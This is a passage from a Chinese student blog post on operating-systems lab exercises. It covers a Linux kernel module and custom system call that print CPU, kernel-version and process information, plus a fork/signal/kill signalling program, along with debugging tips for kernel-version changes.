<p>我百思不得其解，查了大量的资料，都没找到答案。后来发现……</p>
<p>原因竟然是的因为我printk中没有换行符<code>\n</code>所以实际上输出了但是没有显示在日志里，所以看不见。等到我再加载的时候hello就把goodbye顶上来了所以我只能看见hello。</p>
<p>我就说为啥测试的时候第一遍加载没有输出，卸载输出hello，然后加载输出goodbye，卸载输出hello开始循环。我在这个<code>\n</code>上吃了不少苦头，在上面设计系统调用的时候我一开始也没有加<code>\n</code>，上面那个图加了换行符是我做到这才反应过来换上去的，实际上上面那个图中输出的“Hello
World!!!”是我在截图之前测试了两次，把第一次的顶上来了，我当时以为是输出了，写的时候我还纳闷怎么突然又输出来了。</p>
<p>这个换行符坑了我不知道多少时间，来来回回我因为测试结果有问题又重新编译了好几次内核。</p>
<h1 id="实验一设计一个系统调用">实验一——设计一个系统调用</h1>
<p>知道了如何设计系统调用，我们就可以开始做第一个实验了。</p>
<h2 id="实验内容">实验内容</h2>
<p>设计一个系统调用，功能是将系统的相关信息（CPU型号、操作系统的版本号、系统中的进程等类似于Windows的任务管理器的信息）以文本形式列表显示于屏幕，并编写用户程序予以验证。</p>
<h2 id="前导知识">前导知识</h2>
<p>要输出CPU型号，操作系统的版本号和系统中的进程，首先得知道我们去哪里找这些信息。</p>
<p>CPU型号和操作系统我们可以在<code>/proc</code>文件夹下找到：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> /proc/cpuinfo	<span class="comment">#cpu信息</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> /proc/version 	<span class="comment">#系统版本信息</span></span><br></pre></td></tr></table></figure>
<p>关于<code>/proc</code>文件夹，在“加入自己的Hello
Module动态模块”的最后我提到了一下。实际上<code>/proc</code>是一个位于内存的<strong>伪文件系统</strong>，通过<code>/proc</code>我们可以运行时访问内核内部数据结构、改变内核设置的机制。用户和应用程序可以通过<code>/proc</code>得到系统的信息，并可以改变内核的某些参数。由于系统的信息，如进程，是动态改变的，所以用户或应用程序读取<code>/proc</code>文件时，<code>/proc</code>文件系统是动态从系统内核读出所需信息并提交的。
注意<code>/proc</code>里面的文件不是真的存在于硬盘中的文件，它们只是内存中的映像。</p>
<p>系统中的进程相关信息记录在<code>task_struct</code>结构体中。<code>task_struct</code>是Linux内核的一种数据结构，它会被装载到RAM中并且包含着进程的信息。每个进程都把它的信息放在
<code>task_struct</code>这个数据结构体。具体使用在代码中就可以看到。</p>
<p>这两部分内容这里都只是简单提了一下，如果要是深入讲解那又可以写两篇文章了，秉着知识屏蔽的原则，这里不展开讲了。各位读者感兴趣可以自学一下。</p>
<h2 id="实验思路">实验思路</h2>
<p>我们要设计一个系统调用，如果直接修改内核添加系统调用然后编译内核进行调试，那效率实在是太低（一次写成的大佬当我没说），因此我首先用动态模块把程序写好，然后再添加到系统调用里并重新编译，这样就大大提高了效率。</p>
<p>实际上，也可以用动态模块直接写一个钩子来修改系统调用（注意是修改不是添加，动态模块没法添加系统调用，但是可以修改现有的系统调用），但是由于要利用sys_call_table表，而在实验过程中发现4.16.10版本中获取sys_call_table表的地址存在许多问题，由于我目前水平太菜还没有解决，所以这种方法先暂时不用，以后应该会更新这个方法。</p>
<p>这个实验思路很直接，就是找到所需要的信息并打印出来。</p>
<h2 id="代码实现">代码实现</h2>
<p>知道了信息的位置，那剩下的就是代码实现了。这里给出我的动态模块源代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;linux/sched/signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> buf[<span class="number">41</span>];</span><br><span class="line"><span class="type">static</span> <span class="type">char</span> buf1[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">init_mymod</span><span class="params">(<span class="type">void</span>)</span>    <span class="comment">//声明是一个模块以及加载时初始化的动作</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">fp</span>;</span></span><br><span class="line">    <span class="type">mm_segment_t</span> fs;</span><br><span class="line">    <span class="type">loff_t</span> pos;</span><br><span class="line"></span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;Hello Module!\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//准备打印CPU型号</span></span><br><span class="line">    printk(<span class="string">&quot;/***************cpu info****************/\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fp = filp_open(<span class="string">&quot;/proc/cpuinfo&quot;</span>,O_RDONLY,<span class="number">0</span>);<span class="comment">//打开文件并存到结构体中，准备进行后续操作</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(IS_ERR(fp)) <span class="comment">//判断文件是否正常打开</span></span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;create file error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fs = get_fs();</span><br><span class="line">    set_fs(KERNEL_DS);</span><br><span class="line"></span><br><span class="line">    pos = <span class="number">79</span>;	<span class="comment">//文件操作的起始位置</span></span><br><span class="line">    kernel_read(fp,buf,<span class="keyword">sizeof</span>(buf),&amp;pos);</span><br><span class="line">	printk(KERN_ALERT <span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">    </span><br><span class="line">    filp_close(fp,<span class="literal">NULL</span>);</span><br><span class="line">    set_fs(fs);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//准备打印系统版本信息</span></span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;/***************system version****************/\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	fp = filp_open(<span class="string">&quot;/proc/version&quot;</span>,O_RDONLY,<span class="number">0</span>);<span class="comment">//open file</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(IS_ERR(fp)) </span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;create file error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fs = get_fs();</span><br><span class="line">    set_fs(KERNEL_DS);</span><br><span class="line"></span><br><span class="line">    pos = <span class="number">0</span>;</span><br><span class="line">    kernel_read(fp,buf1,<span class="keyword">sizeof</span>(buf1),&amp;pos);</span><br><span class="line">	printk(KERN_ALERT <span class="string">&quot;%s\n&quot;</span>,buf1);</span><br><span class="line">    </span><br><span class="line">    filp_close(fp,<span class="literal">NULL</span>);</span><br><span class="line">    set_fs(fs);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//准备打印进程信息</span></span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;/*************processes information**************/\n&quot;</span>);</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;%-20s%-10s%-15s%-15s%-10s\n&quot;</span>,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;pid&quot;</span>,<span class="string">&quot;time(userM)&quot;</span>,<span class="string">&quot;time(kernelM)&quot;</span>,<span class="string">&quot;state&quot;</span>);</span><br><span class="line">    for_each_process(p)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;%-20s%-10d%-15lld%-15lld%-5ld\n&quot;</span>,p-&gt;comm,p-&gt;pid,(p-&gt;utime)/<span class="number">60</span>,(p-&gt;stime)/<span class="number">60</span>,p-&gt;state);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exit_mymod</span><span class="params">(<span class="type">void</span>)</span>   <span class="comment">//卸载模块时的动作</span></span><br><span class="line">&#123;</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;Goodbye Module!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(init_mymod);</span><br><span class="line">module_exit(exit_mymod);</span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line">MODULE_DESCRIPTION(<span class="string">&quot;Test&quot;</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">&quot;WPX&quot;</span>);</span><br></pre></td></tr></table></figure>
<p>需要注意的是第一个输出CPU型号的buf和pos需要自己设置成适合自己的，因为每个人的CPU型号不同，我设置测试的最终结果如图，正好把我的型号输出出来：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571817038619.png" class="" width="1571817038619">
<p>现在加载我们的模块看看效果（长图预警）：</p>
<p><img src="/2019/10/17/Lecture/OS实验之玩转linux内核/2019-10-23_172003.png"  alt="2019-10-23_172003" style="zoom:60%;" /></p>
<p>看上去还不错！那么现在我们就可以把它添加到系统调用里去了，添加方法上文已经说了。（修改sys.c的时候不要忘了添加头文件哦！）</p>
<p>最终添加的系统调用号为334，调用具体代码如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">asmlinkage <span class="type">long</span> <span class="title function_">sys_getinfo</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> buf[<span class="number">41</span>];</span><br><span class="line">    <span class="type">static</span> <span class="type">char</span> buf1[<span class="number">1024</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">p</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">fp</span>;</span></span><br><span class="line">    <span class="type">mm_segment_t</span> fs;</span><br><span class="line">    <span class="type">loff_t</span> pos;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//准备打印CPU型号</span></span><br><span class="line">    printk(<span class="string">&quot;/***************cpu info****************/\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    fp = filp_open(<span class="string">&quot;/proc/cpuinfo&quot;</span>,O_RDONLY,<span class="number">0</span>);<span class="comment">//打开文件并存到结构体中，准备进行后续操作</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(IS_ERR(fp)) <span class="comment">//判断文件是否正常打开</span></span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;create file error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fs = get_fs();</span><br><span class="line">    set_fs(KERNEL_DS);</span><br><span class="line"></span><br><span class="line">    pos = <span class="number">79</span>;	<span class="comment">//文件操作的起始位置</span></span><br><span class="line">    kernel_read(fp,buf,<span class="keyword">sizeof</span>(buf),&amp;pos);</span><br><span class="line">	printk(KERN_ALERT <span class="string">&quot;%s\n&quot;</span>,buf);</span><br><span class="line">    </span><br><span class="line">    filp_close(fp,<span class="literal">NULL</span>);</span><br><span class="line">    set_fs(fs);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//准备打印系统版本信息</span></span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;/***************system version****************/\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	fp = filp_open(<span class="string">&quot;/proc/version&quot;</span>,O_RDONLY,<span class="number">0</span>);<span class="comment">//open file</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(IS_ERR(fp)) </span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;create file error\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fs = get_fs();</span><br><span class="line">    set_fs(KERNEL_DS);</span><br><span class="line"></span><br><span class="line">    pos = <span class="number">0</span>;</span><br><span class="line">    kernel_read(fp,buf1,<span class="keyword">sizeof</span>(buf1),&amp;pos);</span><br><span class="line">	printk(KERN_ALERT <span class="string">&quot;%s\n&quot;</span>,buf1);</span><br><span class="line">    </span><br><span class="line">    filp_close(fp,<span class="literal">NULL</span>);</span><br><span class="line">    set_fs(fs);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//准备打印进程信息</span></span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;/*************processes information**************/\n&quot;</span>);</span><br><span class="line">    printk(KERN_ALERT <span class="string">&quot;%-20s%-10s%-15s%-15s%-10s\n&quot;</span>,<span class="string">&quot;name&quot;</span>,<span class="string">&quot;pid&quot;</span>,<span class="string">&quot;time(userM)&quot;</span>,<span class="string">&quot;time(kernelM)&quot;</span>,<span class="string">&quot;state&quot;</span>);</span><br><span class="line">    for_each_process(p)</span><br><span class="line">    &#123;</span><br><span class="line">        printk(KERN_ALERT <span class="string">&quot;%-20s%-10d%-15lld%-15lld%-5ld\n&quot;</span>,p-&gt;comm,p-&gt;pid,(p-&gt;utime)/<span class="number">60</span>,(p-&gt;stime)/<span class="number">60</span>,p-&gt;state);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">334</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>用上次测试系统调用的程序测试一下：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571822845749.png" class="" width="1571822845749">
<p>输出到了控制台中，系统调用成功！</p>
<p>注意：我使用的是ubuntu
server，使用的终端是物理终端，而printk输出的位置就是物理终端，如果你使用的是图形化界面，那么你可能会发现信息没有输出到你的终端上，因为图形化界面使用的不是物理终端，需要用户更改为物理终端，更改方法可以在网上查找资料。</p>
<h2 id="避免采坑-3">避免采坑</h2>
<h3 id="vfs_read">vfs_read……</h3>
<p>我看网上说内核用vfs_read、vfs_write等函数来操作文件，但是我写的时候报错说未定义的函数。我找了半天最后发现是在4.14版本以后，内核不再支持vfs_read、vfs_write等函数，而是改用kernel_read、kernel_write等函数。如果使用vfs_read、vfs_write等函数会报错。把vfs改成kernel就好了。</p>
<h3 id="用户空间和系统空间">用户空间和系统空间</h3>
<p>在对文件进行操作的时候，我直接使用了kernel_read函数，然后报错了。后来发现是因为kernel_read等函数它们默认的参数（buf）是指向用户空间的内存地址，而现在buf在内核空间，因此会出错。这个可以通过get_fs和set_fs修改。简单来说就是这样：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">mm_segment_t</span> fs = get_fs();</span><br><span class="line">set_fs(KERNEL_DS);</span><br><span class="line"></span><br><span class="line"><span class="comment">//然后开始文件操作例如kernel_read()</span></span><br><span class="line"></span><br><span class="line">filp_close(fp,<span class="literal">NULL</span>);</span><br><span class="line">set_fs(fs);</span><br></pre></td></tr></table></figure>
<p>具体的知识点这里不讲了，有兴趣的可以自行上网学习，这里给一篇参考文章：<a
href="https://blog.csdn.net/Tommy_wxie/article/details/8194276">《在linux内核中读写文件》</a>。</p>
<h3 id="sys_call_table地址">sys_call_table地址</h3>
<p>本来我想直接用动态模块写个钩子修改系统调用，结果获得地址之后运行发现永远不对，后来发现在linux2.6版本之后，出于保护系统的目的，不能直接导出sys_call_table的地址，因此使用如下命令得到的地址不是真实的物理地址，不能直接使用：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571498488155.png" class="" width="1571498488155">
<p>否则会报错，而且模块无法通过<code>rmmod</code>命令卸载，会显示正在使用，非常棘手（有解决办法，但很麻烦，所以我每次都是直接恢复快照）。</p>
<h3 id="获取文件大小">获取文件大小</h3>
<p>在写代码的时候因为cpuinfo太长了打印不完，我一开始想动态获取文件大小然后再打印整个文件。在网上找了很多办法，看到别人用f-&gt;f_dentry-&gt;d_inode，但是我每次都报错，后来发现是在3.19版本之后内核不支持f-&gt;f_dentry-&gt;d_inode了，需要使用file_inode(f)替换掉f-&gt;f_dentry-&gt;d_inode。具体如下：</p>
<p>Linux 3.19 compat: file_inode was added</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">struct access f-&gt;f_dentry-&gt;d_inode was replaced by accessor function</span><br><span class="line">file_inode(f)</span><br><span class="line"></span><br><span class="line">Signed-off-by: Joerg Thalheim &lt;joerg@higgsboson.tk&gt;</span><br><span class="line">Signed-off-by: Brian Behlendorf &lt;behlendorf1@llnl.gov&gt;</span><br></pre></td></tr></table></figure>
<p>修改之后编译成功了发现获取的大小是0，后来才反应过来<code>/proc</code>中的文件不是真的文件因此没有大小可言……再后来反应过来要求不是要CPU型号嘛，那我直接光输出个型号不就可以了吗！</p>
<h3 id="for_each_process">for_each_process</h3>
<p>在使用
for_each_process时，有很多资料显示需要添加的头文件为<code>linux/sched.h</code>，但我编译的时候发现报错：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1571806269316.png" class="" width="1571806269316">
<p>后来发现在
4.11以后，该方法都放在了<code>include/linux/sched/signal.h</code>中
,因此需要修改头文件，修改之后就好了。</p>
<h1 id="实验2-1进程的软中断通信">实验2-1——进程的软中断通信</h1>
<h2 id="实验内容-1">实验内容</h2>
<p>编制实现软中断通信的程序。使用系统调用fork()创建两个子进程，再用系统调用signal()让父进程捕捉键盘上发出的中断信号（即按delete键），当父进程接收到这两个软中断的某一个后，父进程用系统调用kill()向两个子进程分别发出整数值为16和17软中断信号，子进程获得对应软中断信号，然后分别输出下列信息后终止：</p>
<ul>
<li>Child process 1 is killed by parent !!<br />
</li>
<li>Child process 2 is killed by parent !!</li>
</ul>
<p>父进程调用wait()函数等待两个子进程终止后，输出以下信息，结束进程执行：</p>
<ul>
<li>Parent process is killed!!</li>
</ul>
<p>多运行几次编写的程序，简略分析出现不同结果的原因。</p>
<h2 id="前导知识-1">前导知识</h2>
<h3 id="fork">fork()</h3>
<p>这里简单说一下，fork()的作用就是创建一个子进程，fork把父进程复制一份给子进程，需要注意的是fork返回值是两个。在子进程中返回0，父进程中返回子进程的pid，还有一种情况是创建失败时会返回-1。</p>
<p>如果想深入了解推荐一个大佬的博客，写的有多好呢？这么说吧，我第一次见到CSDN光评论就几百条的（可能是我见识太少）：<a
href="https://blog.csdn.net/jason314/article/details/5640969">《linux中fork（）函数详解（原创！！实例讲解）》</a></p>
<h3 id="signal">signal()</h3>
<p>捕捉中断信号sig后执行function规定的操作。就有点像if语句，捕获到信号之后就调用指定的函数。</p>
<p>用法如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span>	<span class="comment">//头文件</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> sig;</span><br><span class="line"><span class="type">void</span> <span class="title function_">function</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line">signal(sig,function)	<span class="comment">//参数定义</span></span><br></pre></td></tr></table></figure>
<p>sig一个有19个值：</p>
<table>
<thead>
<tr class="header">
<th>值</th>
<th>名字</th>
<th>说明</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>01</td>
<td>SIGHUP</td>
<td>挂起</td>
</tr>
<tr class="even">
<td>02</td>
<td>SIGINT</td>
<td>中断，当用户从键盘键入“del”键时</td>
</tr>
<tr class="odd">
<td>03</td>
<td>SIGQUIT</td>
<td>退出，当用户从键盘键入“quit”键时</td>
</tr>
<tr class="even">
<td>04</td>
<td>SIGILL</td>
<td>非法指令</td>
</tr>
<tr class="odd">
<td>05</td>
<td>SIGTRAP</td>
<td>断点或跟踪指令</td>
</tr>
<tr class="even">
<td>06</td>
<td>SIGIOT</td>
<td>IOT指令</td>
</tr>
<tr class="odd">
<td>07</td>
<td>SIGEMT</td>
<td>EMT指令</td>
</tr>
<tr class="even">
<td>08</td>
<td>SIGFPE</td>
<td>浮点运算溢出</td>
</tr>
<tr class="odd">
<td>09</td>
<td>SIGKILL</td>
<td>要求终止进程</td>
</tr>
<tr class="even">
<td>10</td>
<td>SIGBUS</td>
<td>总线错误</td>
</tr>
<tr class="odd">
<td>11</td>
<td>SIGSEGV</td>
<td>段违例，即进程试图去访问其地址空间以外的地址</td>
</tr>
<tr class="even">
<td>12</td>
<td>SIGSYS</td>
<td>系统调用错</td>
</tr>
<tr class="odd">
<td>13</td>
<td>SIGPIPE</td>
<td>向无读者的管道中写数据</td>
</tr>
<tr class="even">
<td>14</td>
<td>SIGALARM</td>
<td>闹钟</td>
</tr>
<tr class="odd">
<td>15</td>
<td>SIGTERM</td>
<td>软件终止</td>
</tr>
<tr class="even">
<td>16</td>
<td>SIGUSR1</td>
<td>用户自定义信号</td>
</tr>
<tr class="odd">
<td>17</td>
<td>SIGUSR2</td>
<td>用户自定义信号</td>
</tr>
<tr class="even">
<td>18</td>
<td>SIGCLD</td>
<td>子进程死</td>
</tr>
<tr class="odd">
<td>19</td>
<td>SIGPWR</td>
<td>电源故障</td>
</tr>
</tbody>
</table>
<h3 id="kill">kill()</h3>
<p>一个进程向同一用户的其他进程pid发送信号。</p>
<p>用法为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line"><span class="type">int</span> sig;</span><br><span class="line"></span><br><span class="line">kill(pid,sig);</span><br></pre></td></tr></table></figure>
<p>pid：可能选择有以下四种</p>
<ol type="1">
<li>pid大于零时，pid是信号欲送往的进程的标识。</li>
<li>pid等于零时，信号将送往所有与调用kill()的那个进程属同一个组的进程。</li>
<li>pid等于-1时，信号将送往所有调用进程有权给其发送信号的进程，除了进程1(init)。</li>
<li>pid小于-1时，信号将送往以-pid为组标识的进程。</li>
</ol>
<p>sig：准备发送的信号代码，假如其值为零则没有任何信号送出，但是系统会执行错误检查，通常会利用sig值为零来检验某个进程是否仍在执行。</p>
<p>返回值说明： 成功执行时，返回0；失败返回-1。</p>
<h2 id="实验思路-1">实验思路</h2>
<p>要求很明确，很直接。需要注意的就是在代码实现的时候注意写父进程和子进程的运行语句的位置，有的时候很容易把人绕进去。</p>
<h2 id="代码实现-1">代码实现</h2>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*	ex2.c</span></span><br><span class="line"><span class="comment"> *	Copyright (c) wpx</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> wait_flag = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">stop</span><span class="params">()</span>&#123;wait_flag = <span class="number">0</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> p1,p2;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span>((p1 = fork()) == <span class="number">-1</span>);	<span class="comment">//创建子进程1</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span>(p1)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">while</span>((p2 = fork()) == <span class="number">-1</span>);	<span class="comment">//创建子进程2</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(p2)	<span class="comment">//父进程执行语句</span></span><br><span class="line">        &#123;</span><br><span class="line">            signal(SIGQUIT,stop);</span><br><span class="line">            <span class="keyword">while</span>(wait_flag);	<span class="comment">//等待软中断Quit信号(Ctrl + \)</span></span><br><span class="line">            </span><br><span class="line">            kill(p1,<span class="number">16</span>);</span><br><span class="line">            kill(p2,<span class="number">17</span>);</span><br><span class="line">            wait(<span class="number">0</span>);</span><br><span class="line">            wait(<span class="number">0</span>);</span><br><span class="line">            </span><br><span class="line">            sleep(<span class="number">3</span>);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\nParent process is killed !!\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">else</span>	<span class="comment">//子进程2执行语句</span></span><br><span class="line">        &#123;</span><br><span class="line">            signal(SIGQUIT,SIG_IGN);	<span class="comment">//忽略Quit信号</span></span><br><span class="line">            wait_flag = <span class="number">1</span>;</span><br><span class="line">            </span><br><span class="line">            signal(<span class="number">17</span>,stop);</span><br><span class="line">            <span class="keyword">while</span>(wait_flag);</span><br><span class="line">            </span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\nChild process 2 is killed by parent !!\n&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>	<span class="comment">//子进程1执行语句</span></span><br><span class="line">    &#123;</span><br><span class="line">        signal(SIGQUIT,SIG_IGN);</span><br><span class="line">       	wait_flag = <span class="number">1</span>;</span><br><span class="line">            </span><br><span class="line">        signal(<span class="number">16</span>,stop);</span><br><span class="line">        <span class="keyword">while</span>(wait_flag);</span><br><span class="line">            </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\nChild process 1 is killed by parent !!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行程序，键盘输入Quit信号（ctrl+），子进程12退出，父进程等待3秒后退出：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1572248369602.png" class="" width="1572248369602">
<p>多次执行会发现子进程结束时间不确定：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1572252482068.png" class="" width="1572252482068">
<p>原因可能是因为子进程之间是彼此并行的，两个子进程同时获得信号，因此结束时间不确定。</p>
<h2 id="避免采坑-4">避免采坑</h2>
<h3 id="while语句">while语句</h3>
<p>我在创建子进程的时候少加了一个括号，我是这样写的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>(p1 = fork() == <span class="number">-1</span>);</span><br></pre></td></tr></table></figure>
<p>在运行程序的时候死活没结果，输入啥也不行，ctrl++c强制退出</p>
<p>后来发现其实我在这一步就有问题了，正确的写法是这样的：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">while</span>((p1 = fork()) == <span class="number">-1</span>);</span><br></pre></td></tr></table></figure>
<p>加个括号之后，程序就成功运行了。</p>
<h3 id="信号忽略sig_ign">信号忽略SIG_IGN</h3>
<p>我的代码在子进程中有一句<code>signal(SIGQUIT,SIG_IGN)</code>，实际上在一开始我并没有加这句代码。在我运行的过程中我发现，不管我试了多少次，子进程都没有输出，只有父进程输出了：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1572248861081.png" class="" width="1572248861081">
<p>后来我发现如果我不用键盘输入quit，而是在一个新的终端中用kill命令给父进程quit信号，那么就能正常输出。</p>
<p>先通过<code>ps -a</code>获取父进程pid号（pid最小的就是父进程），然后使用<code>kill -QUIT 父进程pid号</code>给进程发送信号：</p>
<img src="/2019/10/17/Lecture/OS%E5%AE%9E%E9%AA%8C%E4%B9%8B%E7%8E%A9%E8%BD%AClinux%E5%86%85%E6%A0%B8/1572249333433.png" class="" width="1572249333433">
<p>可以看到通过这种方式成功输出了我们想要的结果。我想了半天，但是还是没懂到底是怎么回事。我猜测可能是因为键盘直接输入的方式同时作用于三个进程，直接杀死了剩下两个子进程导致没有输出。所以在子进程中加上忽略Quit信号，这样quit只作用于父进程，子进程就可以收到父进程的信号打印语句了。</p>
<h1 id="实验2-2进程的管道通信">实验2-2——进程的管道通信</h1>
<h2 id="实验内容-2">实验内容</h2>
<p>创建一条管道完成下述工作：</p>
<ol type="1">
